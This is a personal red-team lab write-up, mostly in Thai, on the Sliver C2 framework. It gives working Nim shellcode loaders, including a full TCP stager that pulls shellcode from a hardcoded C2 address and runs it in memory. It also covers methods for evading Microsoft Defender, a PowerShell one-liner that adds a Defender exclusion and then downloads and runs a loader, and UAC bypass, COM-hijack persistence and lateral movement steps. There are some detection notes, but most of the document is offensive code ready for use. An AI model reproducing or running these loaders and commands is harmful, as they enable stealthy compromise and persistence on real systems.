# Sliver C2 Study Writeup

## สารบัญ
1. [Sliver Architecture](#1-sliver-architecture)
2. [Shellcode Injection Logic](#2-shellcode-injection-logic)
3. [VirtualAllocEx & Memory Protection](#3-virtualallocex--memory-protection)
4. [Loader Versions ที่ทดสอบ](#4-loader-versions-ที่ทดสอบ)
5. [EDR vs AV — จับคนละชั้น](#5-edr-vs-av--จับคนละชั้น)
6. [UAC Bypass](#6-uac-bypass)
7. [Persistence Techniques](#7-persistence-techniques)
   - [COM Object Hijacking](#com-object-hijacking-t1546015)
8. [Fragment & Reassemble](#8-fragment--reassemble)
9. [Lateral Movement & Pivot](#9-lateral-movement--pivot)
10. [Sliver Commands Reference](#10-sliver-commands-reference)
11. [TODO: หัวข้อที่ต้องศึกษาเพิ่ม](#11-todo-หัวข้อที่ต้องศึกษาเพิ่ม)

---

## 1. Sliver Architecture

Sliver เป็น open-source C2 framework โดย BishopFox เขียนด้วย Go

### Core Components

| Component | หน้าที่ |
|---|---|
| **Server** | ศูนย์กลาง — build implant, จัดการ job, เก็บข้อมูลใน SQLite |
| **Client (Operator)** | Console สั่งงาน เชื่อมต่อ server ผ่าน gRPC + mTLS |
| **Implant** | Payload ที่ deploy บนเป้าหมาย (Session หรือ Beacon) |
| **Listener** | รับ connection จาก implant ผ่าน protocol ต่างๆ |

### Implant 2 โหมด

- **Session** — real-time interactive, connection ค้างตลอด
- **Beacon** — async callback, check in ตามเวลาที่กำหนด เงียบกว่า

### C2 Protocols

| Protocol | ลักษณะ |
|---|---|
| mTLS | เร็ว เสถียร mutual TLS authentication |
| HTTP/S | ซ่อนใน traffic ปกติ |
| DNS | ช้าแต่ผ่าน firewall ง่าย |
| WireGuard | encrypted VPN tunnel |
| Named Pipes | pivot ภายในเครือข่าย (SMB) |

---

## 2. Shellcode Injection Logic

### 3 ขั้นตอนพื้นฐานเสมอ

```
1. ALLOCATE  — จอง memory ที่รันได้
2. WRITE     — เขียน shellcode ลงไป
3. EXECUTE   — สั่งให้ CPU ไปรัน
```

### Self-injection (ที่ใช้ใน lab)

```
Process ตัวเอง
├── VirtualAllocEx → จอง memory
├── copyMem → เขียน shellcode
└── cast เป็น function pointer → เรียกรัน
```

### Remote injection (inject process อื่น)

```
OpenProcess(target PID)
VirtualAllocEx(target, RWX)
WriteProcessMemory(shellcode)
CreateRemoteThread → รัน
```

---

## 3. VirtualAllocEx & Memory Protection

### Memory Protection Flags

| Flag | ค่า | ความหมาย | ความน่าสงสัย |
|---|---|---|---|
| PAGE_READWRITE | 0x04 | อ่าน+เขียน | ปกติ |
| PAGE_EXECUTE | 0x10 | รันอย่างเดียว | ปกติ |
| PAGE_EXECUTE_READ | 0x20 | รัน+อ่าน | ปกติ (code section) |
| **PAGE_EXECUTE_READWRITE** | **0x40** | **อ่าน+เขียน+รัน** | **Red flag** |

### VirtualAlloc vs VirtualAllocEx

```
VirtualAlloc    = จอง memory ใน process ตัวเอง
VirtualAllocEx  = จอง memory ใน process ไหนก็ได้
```

---

## 4. Loader Versions ที่ทดสอบ

### v1 — Original (โดน Defender)

```nim
# จอง RWX ตรงๆ
let rPtr = VirtualAllocEx(pHandle, NULL, size, 0x3000, PAGE_EXECUTE_READ_WRITE)
copyMem(rPtr, addr shellcode[0], len(shellcode))
let f = cast[proc()](rPtr)
f()
```

ผล: **Defender จับ** — RWX + known API pattern

### v2 — HTTP Loader (หลบ Defender ได้)

```nim
# จอง RW ก่อน
let rPtr = VirtualAlloc(NULL, size, 0x3000, PAGE_READWRITE)
copyMem(rPtr, addr shellcode[0], len(shellcode))

# เปลี่ยนเป็น RX
VirtualProtect(rPtr, size, PAGE_EXECUTE_READ, addr oldProtect)

# Sleep หลบ sandbox
Sleep(10000)

# Execute
let f = cast[proc()](rPtr)
f()
```

ผล: **หลบ Defender ได้** แต่ shellcode 33MB โหลดช้ามาก

### v3 — TCP Stager (ตัวสุดท้ายที่ใช้ ✅)

```nim
import winim/lean
import net

proc main(): void =
  Sleep(10000)

  # Connect ตรงไป Sliver stage-listener
  var sock = newSocket()
  sock.connect("100.103.4.93", Port(8444))

  # Read 4-byte size header
  var sizeData = sock.recv(4)
  var size: uint32
  copyMem(addr size, addr sizeData[0], 4)

  # Read payload
  var shellcode: string = ""
  while shellcode.len.uint32 < size:
    var chunk = sock.recv(4096)
    if chunk.len == 0: break
    shellcode.add(chunk)
  sock.close()

  # Allocate RW → Write → Change to RX → Execute
  let rPtr = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), 0x3000, PAGE_READWRITE)
  copyMem(rPtr, addr shellcode[0], shellcode.len)
  var oldProtect: DWORD
  VirtualProtect(rPtr, cast[SIZE_T](shellcode.len), PAGE_EXECUTE_READ, addr oldProtect)
  let f = cast[proc() {.nimcall.}](rPtr)
  f()
```

ผล: **หลบ Defender + ได้ session สำเร็จ** ✅

ข้อดีเทียบ v2:
- ไม่ต้องเปิด HTTP server แยก
- ไม่ต้องโหลดไฟล์ 33MB (Sliver ส่ง implant ให้ผ่าน TCP)
- exe เล็กกว่า (414KB vs 495KB)

### Delivery Method ที่ใช้

```
Win+R → powershell -w hidden -enc [base64]
  → โหลด loader_v2.exe จาก HTTP
  → เซฟเป็น svc.exe
  → รัน

Sliver setup:
  mtls -l 4443
  profiles new --mtls IP:4443 --os windows --arch amd64 --format shellcode default
  stage-listener --url tcp://IP:8444 --profile default
```

### สิ่งที่เรียนรู้

```
ขั้นตอน                        ผลลัพธ์
1. Keyboard macro พิมพ์เร็ว     ✅ ไม่โดน flag
2. powershell -enc download     ✅ ผ่าน
3. Loader v1 (RWX) รัน         ❌ Defender จับ
4. Loader v2 HTTP (RW→RX)      ✅ ผ่าน Defender แต่ช้า (33MB)
5. Loader v3 TCP Stager        ✅ ผ่าน Defender + session สำเร็จ
6. Python ctypes loader        ✅ BYOE หลบ AV ได้ดี
```

### v4 — Go Loader + Garble (Advanced)

```
Flow: AMSI bypass → ETW patch → Unhook ntdll → Fetch shellcode → Execute
```

เทคนิคที่ใช้:
- AMSI patch → Defender ไม่ scan
- ETW patch → Sysmon ตาบอด
- ntdll unhook → ลบ EDR hooks
- Direct syscall (Hell's Gate + Halo's Gate)
- Sleep obfuscation (Ekko Timer Queue)
- Process Hollowing / Module Stomping / Thread Hijacking

Build:
```bash
# ลง garble
go install mvdan.cc/garble@latest

# build (cross-compile บน Kali)
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
  garble -literals -tiny build -o loader.exe \
  -ldflags="-s -w -H=windowsgui" .
```

garble ทำอะไร:
- `-literals` → encrypt string literals (ชื่อ DLL, function name)
- `-tiny` → ลบ debug info
- symbol names → random

garble ไม่ทำ:
- byte arrays (patch bytes) ยัง hardcode
- behavioral pattern (API call sequence) เหมือนเดิม

Source: `https://github.com/poomiput/playtest`

### Defender Exclusion Technique

ถ้ามี Admin → exclude folder แล้ว Defender ไม่ scan:
```
powershell -w hidden -c "Add-MpPreference -ExclusionPath $env:TEMP; iwr https://raw.githubusercontent.com/poomiput/playtest/main/loader.exe -o $env:TEMP\loader.exe; Start-Process $env:TEMP\loader.exe"
```

ข้อเสีย: Blue Team เช็ค exclusion list ได้ง่าย (`Get-MpPreference`)

### จุดที่ Obfuscate ได้

| จุด | ผลต่อการหลบ |
|---|---|
| Loader obfuscation | สูงสุด (เราคุมได้ทั้งหมด) |
| Shellcode encryption | สูง |
| C2 traffic profile | กลาง |
| Sliver generate flags | ต่ำ (ทำอยู่แล้ว) |

---

## 5. EDR vs AV — จับคนละชั้น

### AV (Defender) จับอะไร

- File signature on disk
- Import table (API names)
- Static patterns

### EDR จับอะไร (runtime behavior)

- API call sequence (VirtualAllocEx → Write → Execute)
- Process creation chain (unknown.exe → cmd.exe)
- Network behavior หลัง execute
- Unbacked executable memory
- ETW events

### Tamper Protection

Microsoft ล็อคไม่ให้ปิด Defender แม้จะเป็น Admin/SYSTEM
- ปิดได้แค่จาก GUI เท่านั้น
- ทำผ่าน command/script ไม่ได้
- นี่คือเหตุผลที่ red team เลือก "หลบ" แทน "ปิด"

### Detection ที่ Blue Team ควรมี

| สิ่งที่ตรวจ | เครื่องมือ |
|---|---|
| RWX memory allocation | ETW + memory scanners |
| API call sequence | EDR behavioral rules |
| Unbacked executable memory | Memory forensics |
| Network after execute | SIEM correlation |
| ETW health | Self-monitoring (ถ้า ETW ถูก patch ทุกอย่างตาบอด) |

---

## 6. UAC Bypass

### เมื่อไหร่ต้อง bypass UAC

```
User เป็น Admin แต่ integrity = Medium (UAC กดลงมา)
ต้อง bypass UAC → ได้ High integrity → getsystem ได้ SYSTEM
```

### Registry values ที่ต้องเช็ค

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
  EnableLUA = 1                        → UAC เปิดอยู่
  ConsentPromptBehaviorAdmin = 5       → ถาม Allow/Deny (bypass ได้)
```

### วิธี bypass ที่ทดสอบ

| วิธี | ผล | หมายเหตุ |
|---|---|---|
| fodhelper.exe + ms-settings registry | โดน EDR จับ | Known pattern แล้ว |
| computerdefaults.exe | ยังไม่ได้ทดสอบ | อาจโดนเหมือนกัน |

### หลักการ UAC Bypass

Auto-elevate binary (trusted by Windows) อ่าน registry → เราเขียน registry ให้ชี้ไป payload → binary รัน payload ด้วย High integrity

---

## 7. Persistence Techniques

### ไม่ต้อง Admin

| วิธี | คำสั่ง | ซ่อนได้ |
|---|---|---|
| Registry Run | `reg add HKCU\...\Run /v name /d path` | ง่ายถูกเจอ |
| Scheduled Task | `schtasks /create /tn name /tr path /sc onlogon` | กลาง |
| Startup Folder | copy exe ไป Startup folder | ง่ายถูกเจอ |

### ต้อง Admin

| วิธี | ซ่อนได้ |
|---|---|
| Service | กลาง |
| WMI Event Subscription | ดี — ซ่อนใน WMI repository |

### COM Object Hijacking (T1546.015)

ไม่ต้อง Admin — เขียน HKCU override ทับ HKLM

ขั้นตอน:
1. เลือก CLSID ที่ใช้บ่อย (เช่น `Scripting.FileSystemObject`)
2. สร้าง `HKCU\Software\Classes\CLSID\{GUID}\InprocServer32` → ชี้ไป DLL ของเรา
3. เมื่อ COM object ถูกสร้าง → Windows โหลด DLL ของเราแทน

```powershell
# install
.\persist_04_com.ps1 -Action install
# trigger (ทดสอบว่าทำงาน)
.\persist_04_com.ps1 -Action trigger
# test (เช็ค Sysmon EID 7/12/13)
.\persist_04_com.ps1 -Action test
# remove (คืนค่าเดิม)
.\persist_04_com.ps1 -Action remove
```

Script: `https://github.com/poomiput/playtest/persistence/persist_04_com.ps1`

Deploy จาก Sliver session:
```
upload persist_04_com.ps1 "C:\\Users\\Public\\Documents\\persist_04_com.ps1"
execute -o powershell -ExecutionPolicy Bypass -File C:\Users\Public\Documents\persist_04_com.ps1 -Action install
```

Detection: Sysmon EID 12 (key create), EID 13 (value set), EID 7 (ImageLoad จาก path แปลก)

### Blue Team ตรวจจับ

- Autoruns (Sysinternals) — scan ทุก persistence location
- Sysmon Event ID 12,13 — registry modification
- Event ID 4698 — scheduled task creation

---

## 8. Fragment & Reassemble

### หลักการ

แยก payload เป็นชิ้นๆ แต่ละชิ้นดูไม่อันตราย → ประกอบรวม + execute ตอน runtime

```
Build (Kali):
  shellc.bin → encrypt → แบ่ง 3 ชิ้น

Execute (Target):
  โหลด part1 + part2 + part3 → รวม → decrypt → execute ใน memory
```

### ทำไม AV จับยาก

- แต่ละชิ้นไม่มี PE header ไม่ match signature
- Encrypt แล้วยิ่งดู random data
- AV scan ทีละไฟล์ ไม่ได้ scan ตอนรวม

### Blue Team จับยังไง

- `copy /b` command ใน Sysmon
- ไฟล์ .dat แปลกๆ ใน Public folder
- Unbacked RWX memory หลัง reassemble

---

## 9. Lateral Movement & Pivot

### Lateral Movement = กระโดดไปเครื่องอื่น

| วิธี | ต้องการ |
|---|---|
| PsExec | admin credentials |
| WMI | admin credentials |
| RDP | username + password |
| Pass-the-Hash | NTLM hash |
| Pass-the-Ticket | Kerberos ticket |

### Pivot = ใช้เครื่องที่ยึดได้เป็นสะพาน

```
Kali → [เครื่องที่ยึดได้] → [internal network]
```

| เครื่องมือ | ใช้ตอน |
|---|---|
| portfwd | เข้า 1 service (เช่น port 3306) |
| socks5 | scan/เข้าหลาย port |
| pivot listener | ได้ session ใหม่ที่เครื่องข้างใน |

---

## 10. Sliver Commands Reference

### Server
```
help, version, jobs, jobs -k [ID]
mtls -L [port], https -L [port], http -L [port], dns -d [domain]
```

### Generate
```
generate --mtls [ip:port] --os windows --arch amd64 --format shellcode --save [path]
generate beacon --mtls [ip:port]   # async mode
implants                            # ดู implants ที่สร้างไว้
```

### Session
```
sessions, use [ID], background, sessions -k [ID]
beacons, beacons -i [ID]
```

### Post-Exploitation (ใน session)
```
info, whoami, getuid, getpid, ps, ifconfig, netstat
ls, cd, pwd, cat, download, upload, rm, mkdir
execute -o [cmd]     # รัน command เดียว (เงียบกว่า shell)
shell                # interactive shell (EDR จับง่าย!)
screenshot
```

### Privilege
```
getprivs, getsystem (ต้อง Admin อยู่แล้ว), runas, impersonate, rev2self
```

### Network
```
portfwd add -r [ip:port], socks5 start, pivots
```

### ข้อควรระวัง
- ใช้ `execute -o` แทน `shell` — EDR จับ shell ทันที
- ใส่ quote ครอบ path ที่มี backslash
- อย่ารัน recon command รัวๆ — EDR จับ enumeration burst
- `%USERNAME%` ไม่ทำงานใน Sliver — ใส่ชื่อ user ตรงๆ

---

## 11. TODO: หัวข้อที่ต้องศึกษาเพิ่ม

### getsystem — ภายในทำงานยังไง
- [ ] Named Pipe Impersonation technique
- [ ] Token Duplication technique  
- [ ] ศึกษา SeDebugPrivilege และ SeImpersonatePrivilege
- [ ] ทำไมต้องเป็น Admin ก่อนถึงจะ getsystem ได้
- [ ] เปรียบเทียบ getsystem ของ Sliver vs Metasploit

### Implant Internals — ภายในไฟล์ทำงานยังไง
- [ ] Go binary structure ของ Sliver implant
- [ ] Implant เชื่อม C2 ยังไง (handshake, key exchange)
- [ ] Anti-forensics ที่ Sliver ทำใน implant
- [ ] เปรียบเทียบ Sliver implant vs Cobalt Strike beacon
- [ ] ลอง reverse engineer implant ด้วย Ghidra

### เทคนิคอื่นที่น่าศึกษา
- [ ] Indirect Syscalls — ข้าม EDR hook
- [ ] API Hashing — ซ่อนชื่อ function
- [ ] Process Hollowing — inject เข้า trusted process
- [ ] AMSI Bypass techniques
- [ ] ETW Patching — ปิดตา EDR
- [ ] Kernel callbacks — ทำงานยังไง
- [ ] Detection Engineering — เขียน Sigma rule

### Repos ที่ควรศึกษา
- [ ] [Project-Onyx](https://github.com/X-3306/Project-Onyx) — AI + WASM evasion (clone ไว้แล้วบน Kali)
- [ ] [SigmaHQ/sigma](https://github.com/SigmaHQ/sigma) — Detection rules
- [ ] [SliverC2-Forensics](https://github.com/Immersive-Labs-Sec/SliverC2-Forensics) — Sliver detection
- [ ] [Direct-vs-Indirect-Syscalls](https://github.com/VirtualAlllocEx/Direct-Syscalls-vs-Indirect-Syscalls)

---

## Lab Environment

| เครื่อง | IP | หน้าที่ |
|---|---|---|
| Kali (keriyn) | 100.103.4.93 (Tailscale) / 192.168.35.137 (LAN) | C2 Server |
| Windows 11 VM | 100.114.153.88 (Tailscale) | Target |

### ไฟล์บน Kali

```
~/Desktop/vt_test/
├── loader_v2.exe        (v3 TCP stager - ตัวหลักที่ใช้)
├── loader_v2.nim        (v3 source)
├── loader_http.exe      (v2 HTTP loader)
├── loader_http.nim      (v2 source)
├── loader.py            (Python ctypes loader - BYOE)
├── loader.exe           (Go loader + garble obfuscated)
├── update.woff2         (Sliver shellcode for Go loader)
├── shellc.bin           (Sliver shellcode stageless)
└── macro.txt            (encoded PowerShell commands)

~/Desktop/playtest/              (Git repo - Go loader source)
├── main.go, inject.go, amsi.go, etw.go, unhook.go, sleep.go
├── syscall_direct.go, syscall_windows_amd64.s
├── build.sh
└── persistence/persist_04_com.ps1

~/Desktop/defender_bypass_with_sliver/   (repo ต้นฉบับ)
```

### Ports ที่ใช้

| Port | Service | หน้าที่ |
|---|---|---|
| 4443 | Sliver mTLS | C2 communication |
| 8444 | Sliver stage-listener | ส่ง implant ให้ stager |
| 9999 | Python HTTP server | serve loader exe + files |

---

*Last updated: 2026-09-15*
*Lab tested with: Sliver v1.7.1, Windows VM with Defender + EDR*
